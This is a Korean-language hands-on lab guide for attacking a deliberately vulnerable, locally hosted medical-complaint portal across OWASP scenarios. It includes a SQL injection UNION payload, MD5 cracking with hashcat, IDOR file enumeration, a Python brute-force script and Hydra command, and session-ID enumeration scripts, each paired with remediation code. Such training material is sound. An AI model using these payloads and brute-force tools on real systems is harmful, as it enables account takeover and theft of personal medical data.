# 취약점 실습 공격 시나리오 가이드

> **대상 시스템**: 공공 의료 민원 포털 (교육/실습용)
> **접속 URL**: `http://localhost:8080`
> **목적**: OWASP Top 10:2025 기반 실제 공격 흐름 실습

---

## 사전 준비

### 앱 실행

```bash
# Docker (권장)
cd /PJT2
docker compose up --build

# 또는 로컬
cd was
pip install -r requirements.txt
flask --app manage.py init-db
flask --app manage.py seed-demo
python manage.py
```

### 기본 계정

| 계정 | 아이디 | 비밀번호 |
|------|--------|----------|
| 관리자 | `admin` | `admin1234` |
| 일반 사용자 1 | `user1` | `user12345` |
| 일반 사용자 2 | `user2` | `user12345` |

### 필요 도구

| 도구 | 용도 | 설치 |
|------|------|------|
| Burp Suite Community | 패킷 캡처·조작 | https://portswigger.net/burp |
| FoxyProxy (Firefox 확장) | 브라우저 프록시 설정 | Firefox 확장 마켓 |
| curl | CLI HTTP 요청 | 기본 탑재 (macOS/Linux) |
| Python 3 | 자동화 스크립트 | https://python.org |

---

## 암호화 실패 (Cryptographic Failures)

---

### 시나리오 C-1: 전송 구간 암호화 누락 (HTTP Plaintext)

**OWASP**: A04 Cryptographic Failures
**위험도**: HIGH
**실습 URL**: `http://localhost:8080/complaints/new`

#### 취약점 개요

Nginx가 HTTP(80포트)만 서비스하고 HTTPS가 없어, 환자가 민원 내용에 이름·증상·연락처를 입력하면 네트워크 구간에서 평문으로 노출됩니다.

```nginx
# web/nginx.conf (현재 취약한 설정)
server {
    listen 80;          # HTTPS 없음
    location / {
        proxy_pass http://was:8000;
    }
}
```

#### 공격 절차

**Step 1 — Burp Suite 설정**

1. Burp Suite 실행 → **Proxy** 탭 → **Options** → `127.0.0.1:8080` 리스너 확인
2. Firefox 설정 → 수동 프록시 → HTTP `127.0.0.1`, 포트 `8080`
3. Firefox에서 `http://localhost:8080` 접속 확인

**Step 2 — 민원 제출 패킷 캡처**

1. `http://localhost:8080/login` → `user1` / `user12345` 로그인
2. **민원** 메뉴 → **민원 신청** (`/complaints/new`)
3. Burp Proxy **Intercept ON** 상태에서 아래처럼 폼 작성:

   | 필드 | 입력값 |
   |------|--------|
   | 제목 | 진료비 과다청구 이의제기 |
   | 내용 | 홍길동, 주민번호 900101-1234567, 고혈압 진단 후 청구된 금액이 과다합니다 |
   | 카테고리 | 보험/진료비 |

4. **민원 제출** 버튼 클릭

**Step 3 — 평문 패킷 확인**

Burp Proxy **Intercept** 탭에서 포착된 요청 확인:

```
POST /complaints/new HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

title=%EC%A7%84%EB%A3%8C%EB%B9%84+%EA%B3%BC%EB%8B%A4%EC%B2%AD%EA%B5%AC&
content=%ED%99%8D%EA%B8%B8%EB%8F%99%2C+%EC%A3%BC%EB%AF%BC%EB%B2%88%ED%98%B8+900101-1234567...
```

URL 디코딩 후 원문 노출:

```
content=홍길동, 주민번호 900101-1234567, 고혈압 진단 후 청구된 금액이 과다합니다
```

> **결과**: 민감 의료 정보가 네트워크 구간에서 평문 노출 확인

#### 증거 확보 방법 (Burp)

- Intercept 탭 → 우클릭 → **Send to Repeater** → 요청 저장
- **HTTP History** 탭 → POST 요청 선택 → Request 탭에서 전체 본문 확인

#### 대응 방안

```nginx
# 안전한 nginx.conf
server {
    listen 80;
    return 301 https://$host$request_uri;  # HTTP → HTTPS 리다이렉트
}

server {
    listen 443 ssl;
    ssl_certificate     /etc/ssl/certs/site.crt;
    ssl_certificate_key /etc/ssl/private/site.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;
    # ...
}
```

---

### 시나리오 C-2: 취약한 해시 알고리즘 (MD5) + SQL Injection으로 비밀번호 탈취

**OWASP**: A04 + A05 Injection
**위험도**: CRITICAL
**실습 URL**: `http://localhost:8080/vulnlab/crypto2`

#### 취약점 개요

비밀번호를 MD5로 저장하면 SQL Injection으로 해시를 탈취한 뒤 온라인 레인보우 테이블로 즉시 원문을 복원할 수 있습니다.

#### 공격 절차

**Step 1 — 실습 페이지 접속**

1. `user1` / `user12345`로 로그인
2. `http://localhost:8080/vulnlab/crypto2` 접속
3. 화면 상단에서 **MD5로 저장된 데모 사용자 테이블** 확인

   ```
   admin_demo  →  0192023a7bbd73250516f069df18b500  (원문: admin1234)
   user1_demo  →  a9af47aba5d87a79bb9ce7dfc11e70f5  (원문: user12345)
   ```

**Step 2 — SQL Injection으로 해시 덤프**

검색 입력란에 아래 페이로드 입력 후 **실행**:

```sql
' UNION SELECT id,username,password_hash,email,role FROM user --
```

또는 화면의 **UNION SELECT password_hash** 버튼 클릭.

> 결과: 현재 앱 DB의 모든 사용자 username + password_hash가 노출됨

**Step 3 — 온라인 MD5 크래킹 (MD5인 경우)**

시나리오에서 해시가 MD5일 때:

1. 화면에서 탈취된 MD5 해시 값 복사
2. 브라우저에서 [CrackStation.net](https://crackstation.net) 접속
3. 해시 붙여넣기 → **Crack Hashes** 클릭
4. 수초 내 원문 비밀번호 복원 확인

   ```
   0192023a7bbd73250516f069df18b500  →  admin1234
   ```

**Step 4 — Hashcat을 이용한 오프라인 크래킹 (참고)**

실제 공격 환경에서는 로컬에서 GPU 가속 크래킹을 수행합니다:

```bash
# rockyou.txt를 사전 파일로 MD5 크래킹
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# -m 0: MD5 모드
# -a 0: 사전 공격
# hashes.txt: 탈취한 MD5 해시 목록
```

> **결과**: MD5 비밀번호는 레인보우 테이블/GPU 크래킹으로 수초~수분 내 복원 가능

#### 대응 방안

```python
# ❌ 취약: MD5
import hashlib
pw_hash = hashlib.md5(password.encode()).hexdigest()

# ✅ 안전: Werkzeug scrypt/PBKDF2 (salt 자동 포함)
from werkzeug.security import generate_password_hash
pw_hash = generate_password_hash(password)
# 결과: pbkdf2:sha256:600000$<salt>$<hash>
# → 동일한 비밀번호도 매번 다른 해시 생성 → 레인보우 테이블 무력화
```

---

### 시나리오 C-3: 파일 다운로드 IDOR (파일명에 개인정보 + 소유권 체크 없음)

**OWASP**: A01 Broken Access Control + A04 Cryptographic Failures
**위험도**: HIGH
**실습 URL**: `http://localhost:8080/vulnlab/crypto3`

#### 취약점 개요

다운로드 URL에 환자 이름·생년월일이 포함된 파일명이 노출되며, 서버가 요청자의 소유권을 검증하지 않아 URL 조작으로 타인의 의료 기록을 다운로드할 수 있습니다.

```
# 취약한 URL 설계
GET /download?file_name=진료기록_홍길동_900101.pdf     ← 개인정보 노출
GET /download?file_name=진료기록_김철수_850315.pdf     ← 파일명만 바꾸면 타인 기록 접근
```

#### 공격 절차

**Step 1 — 정상 사용자로 내 파일 다운로드**

1. `user1`으로 로그인
2. `http://localhost:8080/vulnlab/crypto3` 접속
3. **내 파일 다운로드 (정상)** 버튼 클릭
4. URL 확인: `/vulnlab/crypto3/download?file_name=진료기록_홍길동_900101.pdf`

**Step 2 — URL 파일명 변조 (IDOR 공격)**

방법 A — 화면의 **탈취 다운로드** 버튼 클릭:
- 다른 환자 이름의 진료 기록 파일이 즉시 다운로드됨

방법 B — 주소창에서 직접 변조:
```
http://localhost:8080/vulnlab/crypto3/download?file_name=진료기록_김철수_850315.pdf
```

방법 C — Burp Repeater로 자동화:

```http
GET /vulnlab/crypto3/download?file_name=진료기록_이영희_920720.pdf HTTP/1.1
Host: localhost:8080
Cookie: session=<로그인_세션>
```

접근 가능한 전체 파일 목록:

```
진료기록_홍길동_900101.pdf   → 홍길동, 주민번호 900101-1234567, 고혈압
진료기록_김철수_850315.pdf   → 김철수, 주민번호 850315-1987654, 제2형 당뇨병
진료기록_이영희_920720.pdf   → 이영희, 주민번호 920720-2345678, 디스크
민원결과_박민준_880503.pdf   → 박민준, 주민번호 880503-1567890, 환급 결정
```

**Step 3 — Burp Intruder로 파일 목록 열거**

1. Burp → Proxy HTTP History에서 다운로드 요청 선택
2. 우클릭 → **Send to Intruder**
3. `file_name=§진료기록_홍길동_900101.pdf§` 에서 값 부분을 페이로드 위치로 지정
4. Payloads → Paste: 위 파일 목록 4개 입력
5. **Start Attack** → 200 응답 확인

> **결과**: 다른 환자의 주민번호, 진단명, 처방 내용이 담긴 파일 전체 다운로드 성공

#### 대응 방안

```python
# ❌ 취약: 파일명 직접 노출 + 소유권 체크 없음
@app.route("/download")
@login_required
def download():
    file_name = request.args.get("file_name")  # 개인정보 포함 파일명
    return send_file(f"./reports/{file_name}")  # 소유권 체크 없음!

# ✅ 안전: UUID + 소유권 검증
@app.route("/download/<uuid:file_id>")
@login_required
def download(file_id):
    record = FileRecord.query.get_or_404(file_id)  # UUID로만 조회
    if record.owner_id != current_user.id:          # 소유권 확인
        abort(403)
    # 저장 파일명은 UUID, 다운로드 이름만 표시용으로 별도 관리
    return send_file(
        record.stored_path,
        download_name=record.display_name  # 개인정보 없는 이름
    )
```

---

## 인증 실패 (Authentication Failures)

---

### 시나리오 A-1: 계정 잠금 없음 – RockYou.txt 브루트포스

**OWASP**: A07 Identification and Authentication Failures
**위험도**: HIGH
**실습 URL**: `http://localhost:8080/login`

#### 취약점 개요

로그인 실패 횟수 제한, 지연 시간, 계정 잠금 메커니즘이 없어 무제한으로 비밀번호를 대입할 수 있습니다. 공격자가 `admin` 계정을 타겟으로 `rockyou.txt` 단어 목록을 대입하면 비밀번호를 발견할 수 있습니다.

#### 공격 절차

**Step 1 — 취약점 확인 (수동 테스트)**

브라우저에서 `http://localhost:8080/login`에 틀린 비밀번호를 10회 이상 반복 입력:
- 잠금 메시지 없음
- CAPTCHA 없음
- 지연 없음 → **무제한 시도 가능** 확인

**Step 2 — curl로 기본 동작 확인**

```bash
# 단일 요청 테스트
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://localhost:8080/login \
  -d "username=admin&password=wrongpass" \
  -L | grep -o "로그인\|잘못된\|실패\|성공"
```

**Step 3 — Python 스크립트로 브루트포스 시뮬레이션**

```python
#!/usr/bin/env python3
# brute_force_demo.py
import requests

TARGET = "http://localhost:8080"
USERNAME = "admin"

# rockyou.txt에서 상위 100개 추출 (실습용)
# 실제 공격: /usr/share/wordlists/rockyou.txt (14M개)
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "sunshine",
    "master", "hello", "shadow", "superman", "michael",
    "admin", "admin1234", "admin123", "password1", "pass123",
    "hospital", "medical", "doctor", "nurse", "patient",
    "admin1234",  # ← 실제 관리자 비밀번호
]

session = requests.Session()

# CSRF 토큰 획득 (없으면 생략)
login_page = session.get(f"{TARGET}/login")

print(f"[*] 타겟: {USERNAME}@{TARGET}")
print(f"[*] 시도 횟수: {len(COMMON_PASSWORDS)}개 비밀번호\n")

for i, pw in enumerate(COMMON_PASSWORDS, 1):
    resp = session.post(
        f"{TARGET}/login",
        data={"username": USERNAME, "password": pw},
        allow_redirects=True,
    )
    # 로그인 성공 판단: /login 페이지가 아닌 곳으로 리다이렉트
    is_success = "/login" not in resp.url or "로그아웃" in resp.text

    status = "✓ 성공!" if is_success else "✗ 실패"
    print(f"[{i:3d}] {pw:<20} → {status}")

    if is_success:
        print(f"\n[+] 비밀번호 발견: {pw}")
        print(f"[+] 현재 URL: {resp.url}")
        break
```

```bash
python3 brute_force_demo.py
```

예상 출력:
```
[*] 타겟: admin@http://localhost:8080
[*] 시도 횟수: 27개 비밀번호

[  1] 123456               → ✗ 실패
[  2] password             → ✗ 실패
...
[ 27] admin1234            → ✓ 성공!

[+] 비밀번호 발견: admin1234
[+] 현재 URL: http://localhost:8080/
```

**Step 4 — Burp Suite Intruder로 브루트포스**

1. Burp → `POST /login` 요청 포착 → **Send to Intruder**
2. Positions 탭 → `password=§admin1234§` 에서 값 부분 선택
3. Payloads 탭:
   - Payload type: **Simple list**
   - Payload options: **Load...** → rockyou.txt 선택 (또는 직접 입력)
4. Options 탭:
   - Grep - Match: `로그아웃` 추가 (성공 판별)
5. **Start Attack** 클릭
6. 결과 테이블에서 Length가 다른 요청 또는 `로그아웃` grep이 표시된 항목 확인

**Step 5 — Hydra를 이용한 공격 (Linux 환경)**

```bash
# rockyou.txt를 사용한 HTTP Form 브루트포스
hydra -l admin \
      -P /usr/share/wordlists/rockyou.txt \
      localhost \
      http-post-form "/login:username=^USER^&password=^PASS^:로그인에 실패" \
      -V -f -t 4

# -l: 사용자명 고정
# -P: 비밀번호 사전 파일
# http-post-form: POST 폼 공격
# "URL:파라미터:실패_문자열"
# -f: 첫 성공 시 중단
# -t 4: 스레드 수
```

> **결과**: `admin1234` 비밀번호 발견, 관리자 계정 탈취 성공

#### 대응 방안

```python
# Flask 로그인 라우트에 계정 잠금 추가

from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

_failed_attempts = {}  # {username: int}
LOCKOUT_THRESHOLD = 5
LOCKOUT_WINDOW = 300  # 5분

@app.route("/login", methods=["POST"])
@limiter.limit("10 per minute")  # IP 기반 Rate Limiting
def login():
    username = request.form["username"]

    # 계정 잠금 체크
    if _failed_attempts.get(username, 0) >= LOCKOUT_THRESHOLD:
        flash("계정이 잠겼습니다. 5분 후 다시 시도해주세요.", "danger")
        return render_template("login.html"), 429

    user = User.query.filter_by(username=username).first()
    if user and user.check_password(request.form["password"]):
        _failed_attempts[username] = 0  # 성공 시 초기화
        login_user(user)
        return redirect(url_for("index"))
    else:
        _failed_attempts[username] = _failed_attempts.get(username, 0) + 1
        flash(f"로그인 실패 ({_failed_attempts[username]}/{LOCKOUT_THRESHOLD})", "danger")
        return render_template("login.html"), 401
```

---

### 시나리오 A-2: 순차 세션 ID 추측 공격

**OWASP**: A07 Identification and Authentication Failures
**위험도**: HIGH
**실습 URL**: `http://localhost:8080/vulnlab/auth2`

#### 취약점 개요

로그인 후 발급되는 세션 ID가 `session_id=1`, `2`, `3`처럼 순차적 정수 값이면, 공격자가 자신의 세션 ID에서 ±1을 변경해 타인의 세션을 탈취할 수 있습니다.

```
정상 흐름:  로그인 → Set-Cookie: session_id=10
공격 흐름:  session_id=11, 9, 8... 으로 변경 → 타인의 민원 내역 접근
```

#### 공격 절차

**Step 1 — 취약한 앱 로그인 (피해자 A)**

1. `http://localhost:8080/vulnlab/auth2` 접속
2. 사용자명 `nurse_kim` 입력 → **취약 로그인**
3. 발급된 **session_id 확인** (예: `session_id=1`)

**Step 2 — 다른 사용자로 로그인 (피해자 B)**

1. 사용자명 `admin_demo` 입력 → **취약 로그인**
2. 발급된 **session_id 확인** (예: `session_id=2`)

**Step 3 — 세션 ID 추측으로 타인 계정 접근 (공격자 시점)**

브라우저 주소창에 직접 입력:
```
http://localhost:8080/vulnlab/auth2/profile?session_id=1
http://localhost:8080/vulnlab/auth2/profile?session_id=2
```

→ **자신이 로그인하지 않은 사용자의 이름, 역할, 이메일, 민원 정보 확인**

**Step 4 — curl로 자동화 세션 열거**

```bash
#!/bin/bash
# session_enum.sh - 세션 ID 1~20 열거

BASE="http://localhost:8080/vulnlab/auth2/profile"

for i in $(seq 1 20); do
  echo -n "session_id=$i : "
  curl -s "$BASE?session_id=$i" \
       -H "Cookie: session=<본인_세션_쿠키>" \
       | grep -o '"username">[^<]*' \
       | head -1
done
```

**Step 5 — Burp Intruder로 열거**

1. `GET /vulnlab/auth2/profile?session_id=1` 요청 포착 → **Send to Intruder**
2. `session_id=§1§` 에서 숫자 부분을 페이로드 위치로 지정
3. Payloads → **Numbers**: From `1`, To `20`, Step `1`
4. Grep - Extract: Response에서 `username` 태그 값 추출 설정
5. **Start Attack** → 각 session_id에 대한 사용자 정보 수집

> **결과**: session_id=1~N 범위를 순회하며 모든 활성 세션 사용자 정보 획득

#### 대응 방안

```python
import secrets

# ❌ 취약: 순차 정수
_counter = 0
def issue_session():
    global _counter
    _counter += 1
    return _counter  # 1, 2, 3, 4...

# ✅ 안전: 암호학적 랜덤 토큰 (256bit)
def issue_session():
    return secrets.token_urlsafe(32)
    # 예: "K9mXvR2bLqP8wZnT4hYcD1eA0sJ6uF3g"
    # 2^256 공간 → 추측 불가

# Flask는 기본적으로 itsdangerous.URLSafeTimedSerializer 사용
# → SECRET_KEY만 강력하게 설정하면 자동으로 안전
app.config["SECRET_KEY"] = secrets.token_hex(32)  # 운영 환경에서 환경 변수로
```

---

### 시나리오 A-3: 인증 체크 누락 – 미인증 사용자의 사용자 목록 접근

**OWASP**: A07 + A01 Broken Access Control
**위험도**: CRITICAL
**실습 URL**: `http://localhost:8080/vulnlab/auth3/user-list`

#### 취약점 개요

관리자 전용 사용자 목록 페이지에 `@login_required` 데코레이터가 누락되어, **로그인하지 않은 공격자**가 URL을 직접 입력하면 모든 민원인의 이름, 이메일, 연락처, 역할 정보가 노출됩니다.

```python
# 현재 코드 (취약)
@app.route("/vulnlab/auth3/user-list")
# @login_required  ← 고의로 누락
def admin_user_list():
    users = User.query.all()
    return render_template("users.html", users=users)
```

#### 공격 절차

**Step 1 — 로그아웃 상태 확인**

1. 현재 로그인된 상태라면 `http://localhost:8080/logout` 접속
2. 브라우저 쿠키 완전 삭제 (선택사항): 개발자도구 → Application → Cookies → Clear

**Step 2 — 인증 없이 직접 접근**

로그인하지 않은 상태에서 주소창에 입력:

```
http://localhost:8080/vulnlab/auth3/user-list
```

→ **로그인 페이지로 리다이렉트되지 않고** 모든 사용자 정보가 즉시 표시됨

노출되는 정보:
- 사용자 ID, 아이디(username)
- 이메일 주소
- 실명(full_name)
- 전화번호(phone)
- 역할(user/admin)

**Step 3 — curl로 비인증 접근 확인**

```bash
# 쿠키 없이 직접 요청 (비인증 상태 시뮬레이션)
curl -s http://localhost:8080/vulnlab/auth3/user-list \
  | grep -E "username|email|phone" \
  | head -20
```

**Step 4 — 실제 관리자 페이지 비교 테스트**

현재 앱의 `@admin_required` 데코레이터가 비활성 상태임을 활용:

```bash
# 일반 user1으로 로그인 후 관리자 페이지 접근
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://localhost:8080/login \
  -d "username=user1&password=user12345" -L

curl -s -b cookies.txt \
  http://localhost:8080/admin/users \
  | grep -c "table\|user"
```

→ `admin_required`가 비활성화되어 일반 사용자도 관리자 페이지 접근 가능

**Step 5 — 자동화: 보호되지 않은 엔드포인트 스캐닝**

```python
#!/usr/bin/env python3
# unauth_scan.py
import requests

BASE = "http://localhost:8080"

# 인증이 필요한 페이지 목록
SENSITIVE_PATHS = [
    "/vulnlab/auth3/user-list",  # 취약: 인증 없음
    "/admin",
    "/admin/users",
    "/admin/logs",
    "/admin/complaints",
    "/complaints",
    "/profile",
]

print("[*] 비인증 상태에서 민감 페이지 접근 테스트\n")

s = requests.Session()
for path in SENSITIVE_PATHS:
    resp = s.get(f"{BASE}{path}", allow_redirects=False)
    if resp.status_code == 200:
        status = "⚠ 접근 가능! (취약)"
    elif resp.status_code in (301, 302):
        status = f"→ 리다이렉트 ({resp.headers.get('Location', '')})"
    else:
        status = f"차단 ({resp.status_code})"
    print(f"  GET {path:<35} {status}")
```

예상 출력:
```
  GET /vulnlab/auth3/user-list         ⚠ 접근 가능! (취약)
  GET /admin                           → 리다이렉트 (/login?next=%2Fadmin)
  GET /admin/users                     → 리다이렉트 (/login?...)
  GET /complaints                      → 리다이렉트 (/login?...)
```

> **결과**: `/vulnlab/auth3/user-list`는 인증 없이 즉시 전체 사용자 정보 열람 가능

#### 대응 방안

```python
# ✅ 모든 민감 라우트에 인증 + 권한 데코레이터 적용

@app.route("/admin/user-list")
@login_required    # ← 로그인 여부 확인 (필수)
@admin_required    # ← 관리자 역할 확인 (필수)
def admin_user_list():
    users = User.query.all()
    return render_template("admin/users.html", users=users)

# admin_required를 실제로 활성화
def admin_required(func):
    @wraps(func)
    def wrapped(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != "admin":
            flash("관리자만 접근 가능합니다.", "danger")
            return redirect(url_for("index"))
        return func(*args, **kwargs)
    return wrapped
```

---

## 시나리오 실습 순서 (권장)

```
1. 앱 실행 → seed-demo 데이터 생성
2. C-1: Burp 설정 → 민원 제출 → plaintext 패킷 확인
3. A-3: 로그아웃 → /vulnlab/auth3/user-list 직접 접속 (가장 단순)
4. A-2: /vulnlab/auth2 에서 순차 세션 ID 발급 → 세션 탈취
5. C-3: /vulnlab/crypto3 에서 파일 IDOR 확인
6. C-2: /vulnlab/crypto2 에서 SQLi + 해시 덤프 → 크래킹
7. A-1: Python 스크립트로 브루트포스 → admin 비밀번호 획득
```

---

## 현재 구현 상태 요약

| 시나리오 | URL | 구현 여부 | 비고 |
|----------|-----|-----------|------|
| C-1 전송 구간 암호화 누락 | `/complaints/new` + Burp | ✅ 즉시 실습 가능 | Nginx HTTP only |
| C-2 MD5 해시 + SQLi | `/vulnlab/crypto2` | ✅ 구현 완료 | 데모 MD5 데이터 포함 |
| C-3 파일 다운로드 IDOR | `/vulnlab/crypto3` | ✅ 구현 완료 | 가상 의료 파일 4종 |
| A-1 브루트포스 | `/login` | ✅ 즉시 실습 가능 | 계정 잠금 없음 |
| A-2 순차 세션 ID | `/vulnlab/auth2` | ✅ 구현 완료 | 데모 로그인 시스템 |
| A-3 인증 체크 누락 | `/vulnlab/auth3/user-list` | ✅ 구현 완료 | 비인증 접근 가능 |

---

## 자주 쓰는 Burp Suite 단축키

| 동작 | 단축키 |
|------|--------|
| Intercept ON/OFF 토글 | `Ctrl+T` |
| 캡처된 요청 Forward | `Ctrl+F` |
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Repeater에서 전송 | `Ctrl+Enter` |

---

*이 문서는 교육/실습 목적으로 작성되었습니다. 외부 시스템에 동일 기법을 적용하는 것은 불법입니다.*
